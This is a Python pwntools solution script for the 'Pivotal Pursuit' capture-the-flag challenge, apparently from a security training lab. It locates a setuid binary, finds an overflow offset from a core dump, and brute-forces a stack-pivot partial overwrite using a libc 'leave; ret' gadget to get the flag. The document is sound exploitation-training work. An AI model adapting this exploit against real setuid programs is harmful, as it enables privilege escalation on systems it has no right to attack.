# Pivotal Pursuit
import sys
from concurrent.futures import ProcessPoolExecutor, as_completed

import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])
pwn.context.log_level = "error"


def tee[T: pwn.tube](process: T) -> T:
    import sys

    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    import os
    import stat
    from pathlib import Path

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def find_offset(bin):
    import shutil

    tmp = f"/tmp/{bin.removeprefix('/challenge/')}"
    shutil.copyfile(bin, tmp)
    pwn.os.chmod(tmp, 0o755)  # remove setuid

    io = pwn.process(tmp, level="error")
    io.sendline(pwn.cyclic(256))
    io.wait()
    core = io.corefile
    fault_val = core.read(core.rsp, 4)
    offset = pwn.cyclic_find(fault_val)
    return offset


def one_round(io: pwn.tube, offset: int, ins: int) -> bool:
    try:
        io.recvuntil(b"[LEAK] Your input buffer is located at: ")
        buff_ptr = int(io.recvuntil(b".", drop=True), 16)

        payload = pwn.flat(
            {
                offset - 0x8: buff_ptr - 0x10,
                offset + 0x0: (ins & 0xFFFFFF).to_bytes(3, "little"),
            }
        )
        io.send(payload)

        out = io.recvrepeat()
        if b"pwn" in out:
            pwn.success("Found the flag!")
            print(out.decode())
            return True
    except EOFError:
        pass
    return False


def one_round_worker(bin_path: str, offset: int, ins: int) -> bool:
    io = pwn.process(bin_path, level="error")
    with io:
        return one_round(io, offset, ins)


def one_round_debug(bin_path: str, offset: int, ins: int) -> None:
    io = pwn.gdb.debug(
        bin_path,
        gdbscript="""
        source /opt/gef/gef.py
        # b *main+711
        b *main+887
        c
        """,
    )
    with io:
        one_round(io, offset, ins)


def ctf():
    # pivotal-pursuit
    bin = find_challenge()
    elf = pwn.ELF(bin, checksec=False)

    rop = pwn.ROP(elf.libc)
    ins = rop.find_gadget(["leave", "ret"]).address  # 0x578c8

    offset = find_offset(bin)

    if "gdb" in sys.argv:
        one_round_debug(bin, offset, ins)
        return

    max_rounds = 0xFFFF
    max_workers = min(7, pwn.os.cpu_count() or 1) + 1
    pending_limit = max_workers

    executor = ProcessPoolExecutor(max_workers=max_workers)
    try:
        pending = set()
        submitted = 0

        def submit_round() -> bool:
            nonlocal submitted
            if submitted >= max_rounds:
                return False
            pending.add(executor.submit(one_round_worker, bin, offset, ins))
            submitted += 1
            return True

        while len(pending) < pending_limit and submit_round():
            pass

        while pending:
            for future in as_completed(pending):
                pending.remove(future)
                try:
                    if future.result():
                        executor.shutdown(wait=False, cancel_futures=True)
                        return
                except Exception:
                    pass
                submit_round()
                break
    finally:
        executor.shutdown(wait=False, cancel_futures=True)


if __name__ == "__main__":
    ctf()
